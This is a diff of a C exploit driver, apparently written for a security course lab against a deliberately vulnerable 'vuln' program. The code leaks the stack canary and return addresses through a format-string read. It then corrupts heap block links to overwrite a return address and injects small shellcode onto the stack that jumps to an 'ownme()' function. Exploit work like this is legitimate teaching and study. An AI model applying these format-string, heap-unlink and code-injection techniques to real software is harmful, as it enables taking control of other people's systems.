@@ -29,18 +29,16 @@ char buf[1<<20];
 unsigned end;
 int from_child, to_child;
 
+// Beautified print_escaped: print first two character then, gather by 4 bytes
 void print_escaped(FILE *fp, const char* buf, unsigned len) {
    int i;
    int l=-3;
+   fprintf(stderr, "\n%4d:", 0); // empty line
    for (i=0; i < len; i++) {
-  //    if (isprint(buf[i]))
-    //     fputc(buf[i], stderr);
-     // else fprintf(stderr, "\\x%02hhx", buf[i]);
-	if(i%4==2 && i%16==2)
-		fprintf(stderr, "\n%4d:", l+=4);
-	else if(i%4==2)
-		fprintf(stderr, " ");
-
+      if(i%4==2 && i%16==2)
+         fprintf(stderr, "\n%4d:", l+=4);
+      else if(i%4==2)
+         fprintf(stderr, " ");
       fprintf(stderr, "\\x%02hhx", buf[i]);
    }
 }
@@ -118,8 +116,6 @@ void create_subproc(const char* exec, char* argv[]) {
 #define STRINGIFY(X) STRINGIFY2(X)
 
 int main(int argc, char* argv[]) {
-   unsigned seed;
-
    char *nargv[3];
    nargv[0] = "vuln";
    nargv[1] = STRINGIFY(GRP);
@@ -132,168 +128,154 @@ int main(int argc, char* argv[]) {
 
    getchar();
 
-
-   void *auth_user = 0xbfffe6f0;   // value of user variable in auth
-   void *auth_canary_loc = 0xbfffe88c; // location where auth's canary is stored
-   void *auth_bp_loc = 0xbfffe898; // location of auth's saved bp
-   void *auth_ra_loc = 0xbfffe89c; // location of auth's return address
-
-   void *main_loop2_ebp = 0xbfffefd8; // value of main_loop's ebp from run #2
-   void *auth_user2 = 0xbfffe700; // value of user variable in auth from run #2
-   void *auth_user2_loc = 0xbfffe894; // user variable location from run #2
-   void *auth_pass2_loc = 0xbfffe888; // pass variable location from run #2
-   void *auth_l2_loc = 0xbfffe898; // l variable location from run #2
-   void *auth_ebp2 = 0xbfffe8a8; // value of auth's ebp from run #2
-
-   void *main_loop2_rdbuf = 0xbfffea40;
-
-   unsigned int auth_user_auth_ra_loc_diff = auth_ra_loc - auth_user;
-   unsigned int auth_user_auth_canary_loc_diff = auth_canary_loc - auth_user;
-
-   unsigned int offset_auth_user2_loc = auth_user2_loc - auth_user2;
-   unsigned int offset_auth_pass2_loc = auth_pass2_loc - auth_user2;
-   unsigned int offset_auth_l2_loc = auth_l2_loc - auth_user2;
-
-   // this is the offset where the address of jmp to will happen
-   unsigned int offset_auth_user_main_loop_bp = main_loop2_ebp - auth_user2;
-   fprintf(stderr, "dirver: Expected offset of auth_user from main_loop2 ebp: %d\n", offset_auth_user_main_loop_bp);
-
-   unsigned int offset_auth_ebp = auth_ebp2 - auth_user2;
+   void *main_loop2_ebp = (void*)0xbfffefd8; // value of main_loop's ebp from run #2
+   void *main_loop2_rdbuf = (void*)0xbfffea40;
 
    unsigned int offset_main_loop_rdbuf = main_loop2_ebp - main_loop2_rdbuf;
 
-   // exploit idea
-   // 1. find "jmp -N(%ebp)" assembly
-   // 2. inject code at auth's user[0]
-   // 3. overwrite the return address of g, to the &user[0]
-   // 4. execute "l"
+   /*
+    * Exploit Idea
+    * 1. Create 3 blocks (u, u, p), call each block 1, 2, 3, repectively
+    *       Note. block 2's prev->next = RA
+    *             block 2's next       = address of user[0] ??
+    * 2. Set block 2's inUse to 0 using heap overflow from block 3.
+    * 3. Inject the code on to stack.
+    * 4. Execute the 'l'
+   */
 
-   // 1. create 3 blocks (call dummy u, p, l ) once
-   // 2. overflow blocks so, current->prev->next is the location of RA and current->next is the location of user[0]
-   // 3. before calling 'l' inject the code on to stack
-   // 4. execute the 'l'
-
-   // 1. Extract dynamic values
+   // Detailed steps
+   // 1. Extract runtime information
    put_str("e %431$x %434$x %435$x\n"); // returns the adderss of main_loop()
    send();
 
    void *main_loop_ra, *main_loop_bp, *canary; // address of main_loop's return address
    get_formatted("%x%x%x", &canary, &main_loop_bp, &main_loop_ra); 
-   fprintf(stderr, "driver: Extracted canary: %x temp ebp: %x main_loop_ra: %x\n", canary, main_loop_bp, main_loop_ra);
+   fprintf(stderr, "driver: Extracted canary: %x main_loop_bp: %x main_loop_ra: %x\n", 
+      (unsigned int) canary, 
+      (unsigned int) main_loop_bp, 
+      (unsigned int) main_loop_ra);
 
-   // 2. find where the stack's inject code will be located
-   //void *code_loc = main_loop_bp - offset_auth_user_main_loop_bp ;
+   // 2. Calculate address
+   // 2-1. Find the address of where the injected code will be located
+   //      This is necessary to return to injected code.
    void *code_loc = main_loop_bp - offset_main_loop_rdbuf + 4;
-   fprintf(stderr, "driver: code_loc: 0x%x\n", code_loc);
+   fprintf(stderr, "driver: code_loc: 0x%x\n", (unsigned int) code_loc);
 
-   // 3. prepare 1 block
+   // 2-2. Find address of ownme()
+   int offset_main_loop_ra_and_ownme = 1141; // offset from return address to ownme
+   void *ownme_addr= (void*)((int)main_loop_ra-offset_main_loop_ra_and_ownme);
+   fprintf(stderr, "driver: ownme_addr is %p\n", ownme_addr);
+
+   // 3. Prepare blocks
+   // 3-1. Prepare block 1
    put_str("u dummy\n");
    send();
+   fprintf(stderr, "driver: Sent block 1, press any key to continue.\n");
    getchar();
 
-   // 3-2. send p
+   // 3-2. Prepare block 2
+   char *ts1 = (char*) &code_loc; 
 
-   char *ts1 = &code_loc;
    void *toSend = main_loop_bp + 0x4 - 0xc - 48;
-   char *ts2 = &toSend;
+   char *ts2 = (char*) &toSend;
+   // + 0x4 : to get the location of RA
+   // - 0xc : to get this location dereferenced when "->next" happens
+   // - 48  : to get the RA's location of the main_loop and not main
+   //         this value was retrieved from gdb
 
+   size_t sz = 8;
+   char *expl = (char *) malloc(sz);
+   for(int i = 0; i < 4; i++){
+      expl[i] = ts1[i];
+      expl[i+4] = ts2[i];
+   }
 
-   // block 2
-   size_t sz = 10;
-   char *p1 = (char *) malloc(sz);
-   p1[0] = 'u';
-   p1[1] = ' ';
-   p1[2] = ts1[0];
-   p1[3] = ts1[1];
-   p1[4] = ts1[2];
-   p1[5] = ts1[3];
-   p1[6] = ts2[0];
-   p1[7] = ts2[1];
-   p1[8] = ts2[2];
-   p1[9] = ts2[3];
-
-   put_bin((void*)p1, sz);
+   put_str("u ");
+   put_bin((void*)expl, sz);
    put_str("\n");
    send();
+   fprintf(stderr, "driver: Sent block 2, press any key to continue.\n");
    getchar();
 
-   // 3-3. overwrite the second block with block 3:
-   sz = 260 - 12;
-   p1 = (char *) malloc(sz);
-   p1[0] = 'p';
-   p1[1] = ' ';
+   free(expl);
 
-   p1[sz-4] = 0;
-   p1[sz-3] = 0;
-   p1[sz-2] = 0;
-   p1[sz-1] = 0;
+   // 3-3. Prepare block 3
+   //      Note. this block overwrites the block 2's inUser
+   sz = 256 + 4 - 12;
+   // + 256 : size of the default block
+   // + 4   : to overwrite the first 4 bytes of the next block
+   // - 12  : consider the fact that the payload is loaded +12 offset from 
+   //         the very start of the block
 
-   put_bin((void*)p1, sz);
+   expl = (char *) malloc(sz);
+
+   // to avoid confusion of the payload size, include "p " in the binary payload
+   expl[0] = 'p';
+   expl[1] = ' ';
+
+   // set last 4 bytes to be 0
+   for(int i = 4; i > 0; i--){
+      expl[sz-i] = 0;
+   }
+   
+   put_bin((void*)expl, sz);
    put_str("\n");
    send();
+   fprintf(stderr, "driver: Sent block 3, press any key to continue.\n");
    getchar();
+
+   free(expl);
 
    // 4. Overflow the heap's current->prev->next and current->next
-   // now the ret address is &user
-   fprintf(stderr, "driver: overflow execution with command l\n");
+   //    Now the ret address is &user[0]
    put_str("l ");
    send();
+   fprintf(stderr, "driver: Login attempt\n");
    getchar();
 
-   // 5. before calling 'l', prepare the exploit
+   // 5. before calling 'l', inject code on to the stack
    // 5-1. Generate asm code
-   // E99B9A0408
-   // char *code[] = { 0x89, 0xE8, 0x2D, 0x75, 0x04, 0x00, 0x00, 0xFF, 0xE0, 0x90 }; 
-// A3 9F 9A 04 08 FF 20
-   char *code[] = { 0xB8, 0x9F, 0x9A, 0x04, 0x08, 0xFF, 0xE0, 0x90 } ;
+   /* from as -a --32 jmp_heap_ownme.s (also included in the git)
+   1 0000 B8000000   mov  $0x0, %eax
+   1      00
+   2 0005 FFE0       jmp *%eax
+   3   
+   */
+   char code[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 } ;
    size_t len = 7;
    
-   // 5-2. Prepare the size
-   //unsigned explsz = 4 + auth_user_auth_ra_loc_diff;
-   unsigned explsz = len;
+   // 5-2. Prepare the code injecting payload
+   expl = (char*) malloc(len);
+   memset((void*)expl, '\x90', len);
+   fprintf(stderr, "driver: exploit size: %d\n", len);
 
-   void* *expl = (void**)malloc(explsz);
-   memset((void*)expl, '\x90', explsz);
-
-   fprintf(stderr, "driver: exploit size: %d\n", explsz);
-
-   // Now initialize the parts of the exploit buffer that really matter. Note
-   // that we don't have to worry about endianness as long as the exploit is
-   // being assembled on the same architecture/OS as the process being
-   // exploited.
-   fprintf(stderr, "driver: Setting values at offset: 0x%x\n", 0);
    for(int i = 0; i < len; i++){
       ((char*)expl)[i] = code[i];
    }
 
+   // 5-3. Overwrite the address of ownme, which is dynamically found
+   char *tmp = (char*) &ownme_addr;
+   for(int i = 0; i < 4; i++){
+      ((char*)expl)[i + 1] = tmp[i];
+   }
+   fprintf(stderr, "driver: Inject code        : Setting values at offset: 0x%x\n", 0);
 
-   //fprintf(stderr, "Setting values at offset: 0x%x 0x%x\n", auth_user_auth_canary_loc_diff/sizeof(void*), auth_user_auth_ra_loc_diff/sizeof(void*));
-   //expl[auth_user_auth_canary_loc_diff/sizeof(void*)] = canary;
-   //expl[auth_user_auth_ra_loc_diff/sizeof(void*)] = code_loc;
-
-   // for fake reference to accessible address for strcmp(user, pass, len)
-   //fprintf(stderr, "Setting values at offset: 0x%x\n", offset_auth_l2_loc/sizeof(void*));
-   //expl[offset_auth_l2_loc/sizeof(void*)] = 0; // no length comparison in strcmp
-   //expl[offset_auth_user2_loc/sizeof(void*)] = code_loc;
-   //expl[offset_auth_pass2_loc/sizeof(void*)] = code_loc;
-
-   // for setting correct ebp when calling inserted code
-   //expl[offset_auth_ebp/sizeof(void*)] = main_loop_ra;
-
-   // 6. Now, send the payload (i.e., inject code on to stack)
+   // 6. Inject code on to stack
    put_str("u   ");
-   put_bin((char*)expl, explsz);
+   put_bin((char*)expl, len);
    put_str("\n");
    send();
+   fprintf(stderr, "driver: Code injected\n");
 
    // 7. Execute q
    put_str("q \n");
    send();
+   fprintf(stderr, "driver: Returning from main_loop with q command\n");
 
    usleep(100000);
    get_formatted("%*s");
 
-   //kill(pid, SIGINT);
+   kill(pid, SIGINT);
    int status;
    wait(&status);
 
